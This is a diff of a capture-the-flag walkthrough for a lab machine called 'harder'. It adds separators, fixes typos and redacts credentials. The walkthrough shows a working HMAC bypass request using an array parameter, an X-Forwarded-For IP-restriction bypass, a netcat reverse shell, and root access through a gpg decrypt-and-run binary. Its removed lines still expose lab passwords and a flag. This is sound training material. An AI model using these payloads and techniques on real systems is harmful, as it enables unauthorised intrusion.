@@ -36,7 +36,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.174.177:80/b18b9e1a-96d6-450e-8bf4-cdd4e3a0cf92 => 200. To force processing of Wildcard responses, specify the '--wildcard' switch
 
 THIS MEANS THAT ITS REDIRECTES OUR REQUEST , SO LETS USE BURP TO CHECK THE REDIRECTION
-
+###################################
 HTTP/1.1 200 OK
 Server: nginx/1.18.0
 Date: Sat, 30 Jan 2021 13:28:36 GMT
@@ -53,6 +53,7 @@ WE CAN SEE THAT IS IS REDIRECTING OUR REQUEST TO THAT DOMAIN ,SO ADD THIS IN /ET
 AFTER ADDING THIS AND NAVIGATING THROUGH THE DOMAIN, WE FIND A LOGIN PAGE
 USING THE DEFAULT CREDS AS admin:admin I GOT LOGGED IN, BUT THE PAGE SAYS:
 
+#############
 extra security in place. our source code will be reviewed soon ...
 
 AS WE SEE THE ROOM TAGS 'GIT' IS ALSO PRESENT
@@ -106,7 +107,7 @@ SO USE 'gitdumper.sh' TO DUMP THE WHOLE REPOSITORY
 
 
 LETS CHECK THEM OUT
-
+###########################
 ┌──(kali㉿kali)-[~/harder/git]
 └─$ git show                                                                                                                                                      128 ⨯
 commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
@@ -125,7 +126,7 @@ index 0000000..cda7930
 +secret.php
 
 I SEE THE LOGS:
-
+##############################
 ┌──(kali㉿kali)-[~/harder/git/extract]
 └─$ git log 
 commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
@@ -152,7 +153,7 @@ WE KNOW THAT, credentials.php and secret.php ARE AVAILABLE ON THE SERVER BUT WE 
 now we have to read to source code which we get (restore) from the git repo
 
 first looking into the index.php:
-
+#######################################
 <?php
   session_start();
   require("auth.php");
@@ -174,13 +175,14 @@ first looking into the index.php:
      </tr>
    </table>
 
+#####################################
 
-we can see that, it requires tweo files 'auth.php' and 'credentials.php'
+we can see that, it requires two files 'auth.php' and 'credentials.php'
 and then printing the credentials from the 'creds' array on the screen
 
 
 now look at the auth.php:
-
+###################################
 class Login {
 	// unique prefix that is used with this object (on cookies and password salt)
 	var $prefix = "login_";
@@ -268,12 +270,12 @@ function check(){
 }
 
 function prompt($msg=''){
-
+##############################################
 
 we can see that, this code ony checks the cookies for authorization during login,logout,clearing session etc
 
 we also have a 'hmac.php' file also:
-
+##############################################
 
 <?php
 if (empty($_GET['h']) || empty($_GET['host'])) {
@@ -293,6 +295,7 @@ if ($hm !== $_GET['h']){
   die();
 }
 ?>
+#############################################
 
 this files cheking the parameters provided ie 'h' or 'host' and this files requires the 'secret.php' file
 if these are present then we have 400 request
@@ -302,6 +305,8 @@ if 'n' parameter is set then it creates a sha256 hash and store it in the $secre
 Now $secret becomes false then the third parameter becomes false and we can generate hmac hash of any text and get further.
 
 THE LAST CONDITION SAYS THAT $hm SHOULD EQUAL TO $_GET['h'] THEN ONLY WE CAN BYPASS THE CHECK
+
+######################ILLUSTRATION:####################
 
 php > echo hash_hmac('sha256',Array(),$s);
 PHP Notice:  Undefined variable: s in php shell code on line 1
@@ -316,7 +321,7 @@ POST /index.php?n[]=&host=hack.com&h=3a9a5d25cbbda01eb382ffaaa5d1493478b736dc1da
 
 WE GET THE CREDENTIALS:
  url 	                    username 	password (cleartext)
-http://shell.harder.local 	evs 	9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
+http://shell.harder.local 	evs 	REDACTED
 
 
 WE GOT A NEW SUBDOMAIN, ADD THIS TO HOSTS FILE
@@ -329,11 +334,10 @@ Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
 So now we need to bypass this. In order to bypass this, we need to set the 'X-Forwarded-For' header and set its value to 10.10.10.0/24
 
 AFTER THIS WE GOT A PHP SHELL EXECUTOR
-LETS GET OUR REVESE SHELL:
-YOU HAVE TO DO THIS THROUGH BURP BECAUSE NORMALLY IT WILL EXPIRE YOUR WEBPAGE
+LETS GET OUR REVERSE SHELL:
+YOU HAVE TO DO THIS THROUGH BURP BECAUSE NORMALLY, IT WILL EXPIRE YOUR WEBPAGE
 
 i don't know why im not able to get the reverse shell, i think we should enumerate like this only
-
 
 but i tried again i found out this machine has netcat, using this i got a reverse shell:
 
@@ -346,19 +350,20 @@ id
 uid=1001(www) gid=1001(www) groups=1001(www)
 
 which python
-   
+ 
 which python3
 /usr/bin/python3
 
 using find command for user 'www' i found a interesting file:
 /etc/periodic/15min/evs-backup.sh
 
-LETS CHECK IT
+LETS CHECK IT:
+#######################
 /usr/sbin $ cat /etc/periodic/15min/evs-backup.sh
 #!/bin/ash
 
 # ToDo: create a backup script, that saves the /www directory to our internal server
-# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
+# for authentication use ssh with user "evs" and password "REDACTED"
 /usr/sbin $
 
 WE GOT THE SSH CREDS!!
@@ -404,6 +409,7 @@ harder:/etc$ /usr/local/bin/execute-crypted
 [-] Encrypt the file and run the command: execute-crypted command.gpg
 
 also find a find associated with this binary:
+##################################################
 harder:/usr/local/bin$ cat run-crypted.sh 
 #!/bin/sh
 
@@ -418,6 +424,7 @@ if [ $# -eq 0 ]
     export GNUPGHOME=/root/.gnupg/
     gpg --decrypt --no-verbose "$1" | ash
 fi
+#################################################
 
 which is setting a environ variable then decypting our code, pipe it to the ash command for execution
 so for encryption we have to find a public key 
@@ -439,25 +446,8 @@ gpg: Total number processed: 1
 gpg:               imported: 1
 harder:/usr/local/bin$
 
-encrypt the key:
-
-harder:~$ gpg -r root@harder.local -e cmd 
-gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
-
-sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
- Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
-      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
-
-It is NOT certain that the key belongs to the person named
-in the user ID.  If you *really* know what you are doing,
-you may answer the next question with yes.
-
-Use this key anyway? (y/N) y
-harder:~$ ls
-cmd       cmd.gpg   user.txt
-harder:~$ 
-
-now run that binary with .gpg file as an argument
+###################
+ENCRYPT THE KEY:
 
 harder:~$ echo "cat /root/root.txt" > cmd
 harder:~$ gpg -r root@harder.local -e cmd 
@@ -476,7 +466,8 @@ File 'cmd.gpg' exists. Overwrite? (y/N) y
 harder:~$ /usr/local/bin/execute-crypted cmd.gpg 
 gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
       "Administrator <root@harder.local>"
-3a7bd72672889e0756b09f0566935a6c
+REDACTED
+
 harder:~$ 
 
 GOT THE ROOT FLAG
